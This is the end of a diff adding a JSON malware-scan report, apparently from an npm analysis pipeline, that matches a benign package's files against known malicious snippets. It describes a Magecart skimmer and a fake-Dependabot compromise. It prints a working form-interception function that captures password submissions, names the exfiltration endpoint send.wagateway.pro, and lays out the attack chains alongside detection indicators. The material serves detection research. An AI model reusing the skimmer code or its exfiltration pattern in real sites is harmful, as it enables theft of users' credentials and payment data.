+                  "similar_legitimate_use": "Legitimate analytics or payment processing scripts may collect form data, but only to well-known, documented, and trusted endpoints (such as Stripe or PayPal). These scripts are typically reviewed, not injected, and their network destinations are transparent and verifiable.",
+                  "key_indicators": [
+                    "Hooks into global form submission events using document.addEventListener('submit', ...)",
+                    "Reads and serializes all form data via FormData API",
+                    "Sends outbound HTTPS POST requests to a hardcoded, attacker-controlled domain not associated with the legitimate store",
+                    "Presence of injected or obfuscated JavaScript code not present in the original site source",
+                    "Script appears in unexpected locations (e.g., inline in checkout pages or as a new/modified external script)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a user submits a form in the browser",
+                  "file_location": "Injected <script> tag or inline JavaScript within compromised Warner Music Group online store checkout pages",
+                  "required_permissions": [
+                    "Access to DOM (to hook form submission events and read form data)",
+                    "Network access (to send outbound HTTPS requests to external domains)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Injected JavaScript Magecart skimmer (Warner Music Group online store)",
+                  "package_manager": "N/A (injected client-side JavaScript, not a package manager ecosystem)",
+                  "package_versions": "N/A (malicious code injected directly into production site, not versioned)",
+                  "why_malicious": "The injected JavaScript code acts as a Magecart-style web skimmer, intercepting sensitive customer data (including payment and personal information) from checkout forms on the Warner Music Group online store and exfiltrating it to an attacker-controlled domain. This enables large-scale theft of customer data directly from the browser during legitimate transactions."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to the Warner Music Group online store infrastructure and injects malicious JavaScript code into the checkout or payment pages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious JavaScript is loaded and executed in the browsers of customers visiting the compromised store."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The injected JavaScript hooks into form submission events, collects all data entered by the user (including payment and personal information), and prepares it for exfiltration.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive customer data is captured in the browser before legitimate processing."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The malicious code sends the captured form data via HTTPS POST to an attacker-controlled domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltrated customer data is received by the attacker, enabling theft of personal and financial information for further exploitation or sale."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code that globally hooks into form submission events (e.g., document.addEventListener('submit', ...))",
+                    "Outbound HTTPS POST requests to domains not associated with the legitimate e-commerce platform, especially during checkout or payment form submission",
+                    "Presence of injected, obfuscated, or newly added JavaScript code in checkout or payment pages that is not part of the original site source"
+                  ],
+                  "file_indicators": [
+                    "Unexpected <script> tags or inline JavaScript blocks in checkout or payment pages",
+                    "New or modified external JavaScript files in web server directories (e.g., /js/, /assets/) that are not part of the official site deployment",
+                    "References to external JavaScript files from suspicious or unrecognized domains"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests from client browsers to hardcoded, attacker-controlled domains (e.g., https://malicious-domain.com/collect) during checkout or form submission",
+                    "Frequent small POST requests containing form-encoded or multipart data to unknown domains during the checkout process",
+                    "DNS lookups or connections to domains not present in the legitimate store's allowlist"
+                  ],
+                  "how_to_detect": "Continuously monitor e-commerce site source code for unauthorized changes, especially new or modified JavaScript in checkout/payment pages. Use file integrity monitoring to detect unexpected <script> tags or external script references. Deploy web application firewalls (WAFs) and network monitoring to detect and block outbound POST requests to untrusted domains. Regularly audit network traffic for suspicious destinations and inspect browser-side code for evidence of form data interception and exfiltration."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133736_902424_snippet_3",
+              "source_package": "Unknown (malicious commit via fake Dependabot) (GitHub (malicious commit, not a package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133736_902424/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45573753118515015,
+              "code_similarity": 0.3832714557647705,
+              "behavior_similarity": 0.5282036066055298,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "intercept(window) {\n  if (!window) { return; }\n  const t = window.querySelectorAll(\"input[type='password']\").length > 0;\n  const windowMessageHandler = c(async(event) => {\n    event.preventDefault();\n    const builtMail = event.target.formSerializeObject();\n    await this.send(builtMail).then((canCreateDiscussions) => {\n      screenHandler(false);\n    }, console.error);\n    event.target.submit();\n  }, \"submitHandler\");\n  const screenHandler = ((o = true) => {\n    if (o) {\n      if (!(window == null)) {\n        window.addEventListener(\"submit\", windowMessageHandler);\n      }\n    } else {\n      if (!(window == null)) {\n        window.removeEventListener(\"submit\", windowMessageHandler);\n      }\n    }\n  });\n  interceptToggle();\n  if (t) {\n    screenHandler(true);\n  }\n}",
+                "code_behavior": "At runtime in the browser, the remote script intercepts all password form submissions, serializes the entered credentials, and sends them via HTTPS POST to https://send.wagateway.pro/webhook, resulting in theft of end-user credentials.",
+                "malice_analysis": {
+                  "why_suspicious": "The script attaches event listeners to intercept password form submissions, serializes the form data (including credentials), and exfiltrates it to an external server controlled by the attacker. This is a classic credential-stealing technique.",
+                  "violated_expectations": "Legitimate client-side code should never intercept password fields and transmit user credentials to untrusted or external domains. Such behavior is a direct violation of user privacy and security.",
+                  "similar_legitimate_use": "Form submission interception may be used for client-side validation or analytics, but never for exfiltrating credentials to an external, non-affiliated server.",
+                  "key_indicators": [
+                    "Intercepts all form submissions containing password fields",
+                    "Serializes and sends form data to send.wagateway.pro/webhook",
+                    "No user notification or consent for credential exfiltration",
+                    "Implements event listeners specifically targeting sensitive input types"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime in the browser when the remote script is loaded and executed",
+                  "file_location": "https://send.wagateway.pro/client.js?cache=ignore (fetched by snippet_2)",
+                  "required_permissions": [
+                    "network (to exfiltrate data)",
+                    "DOM access (to intercept form submissions and read input fields)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious commit via fake Dependabot)",
+                  "package_manager": "GitHub (malicious commit, not a package manager)",
+                  "package_versions": "N/A (affects repositories via commit, not a package release)",
+                  "why_malicious": "The attack involves unauthorized commits impersonating Dependabot, introducing a malicious GitHub Actions workflow and modifying all JavaScript files to exfiltrate repository secrets and end-user credentials. The entire commit is malicious, targeting both developer and user security by stealing secrets and injecting credential-stealing code."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker obtains a developer's GitHub personal access token (PAT), likely via a separate malicious package or phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Ability to authenticate as the victim and push code to their repositories."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker uses the stolen PAT to commit malicious code to the victim's repositories, impersonating Dependabot to avoid suspicion.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is introduced into the repository under the guise of a trusted automation tool."
+                  },
+                  {
+                    "step": 3,
+                    "action": "A malicious GitHub Actions workflow is added to exfiltrate repository secrets and variables on every push event.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Repository secrets and variables are sent to the attacker's command and control (C2) server."
+                  },
+                  {
+                    "step": 4,
+                    "action": "All JavaScript files in the repository are modified to append an obfuscated script loader that fetches additional malicious code from an external domain.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "End-users of the web application are exposed to further malicious payloads when they load the compromised JavaScript files."
+                  },
+                  {
+                    "step": 5,
+                    "action": "The loaded remote script intercepts password form submissions in the browser and exfiltrates credentials to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "End-user credentials are stolen and sent to the attacker's C2 server, achieving the attacker's final objective."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Addition or modification of GitHub Actions workflows that POST repository secrets or variables to external domains",
+                    "Mass modification of JavaScript (*.js) files to append obfuscated script loaders",
+                    "JavaScript code that dynamically injects script tags with src pointing to suspicious external domains",
+                    "Client-side code that intercepts password form submissions and sends serialized form data to untrusted endpoints"
+                  ],
+                  "file_indicators": [
+                    ".github/workflows/hook.yml (new or modified workflow file)",
+                    "Obfuscated JavaScript code appended to the end of assets/js/*.js files",
+                    "Presence of script tags with id 'hook-loader' and src set to send.wagateway.pro/client.js"
+                  ],
+                  "network_indicators": [
+                    "https://send.wagateway.pro/webhook",
+                    "https://send.wagateway.pro/client.js?cache=ignore"
+                  ],
+                  "how_to_detect": "Monitor for new or modified GitHub Actions workflows that serialize and POST secrets or variables to external domains. Scan for mass changes to JavaScript files, especially for obfuscated code that injects remote scripts from send.wagateway.pro. Detect client-side code that attaches event listeners to password forms and exfiltrates credentials. Flag any network traffic to send.wagateway.pro domains as a high-confidence indicator of compromise."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-update-forms/0.5.8/package/public/js/content.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-update-forms/0.5.8/package/public/js/editor.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
